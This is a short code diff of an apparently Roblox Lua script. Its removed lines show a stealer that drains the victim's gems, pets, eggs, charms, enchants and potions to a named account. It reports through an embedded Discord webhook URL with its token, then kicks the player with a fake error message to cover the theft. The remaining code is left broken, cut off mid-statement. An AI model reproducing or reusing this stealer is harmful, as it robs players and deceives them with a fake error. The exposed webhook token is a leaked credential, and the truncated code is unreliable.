@@ -1,9 +1,4 @@
-Username = "TheNormalGamer5"
-Webhook = "https://discord.com/api/webhooks/1212714715885871114/ttnpUFvqddKovnF6p8nt9fu78_caiSTc_0lMAsF4Ah5nWgOdj4QRrftsTgV5zjJxqP7c"
-min_rap = 50000
 
-function SendMessage(url, username, itemID)
-    local http = game:GetService("HttpService")
     local headers = {
         ["Content-Type"] = "application/json"
     }
@@ -329,29 +324,4 @@ end
 function SendAllGems()
 	repeat
 		GemSteal()
-	until CountGems() == nil or CountGems() < 10000
-end
-
-	EmptyBoxes()
-	SendAllHuges()
-	SendAllExc()
-
-	if save.Egg ~= nil then
-		EggSteal()
-	end
-
-	if save.Charm ~= nil then
-		CharmSteal()
-	end
-	
-	if save.Enchant ~= nil then
-		EnchantSteal()
-	end
-	
-	if save.Potion ~= nil then
-		PotionSteal()
-	end
-
-	SendAllGems()
-	setclipboard("Szix")
-	plr:kick("Error on script execution: 0x0001F4A2")
+	until CountGems() == nil or 
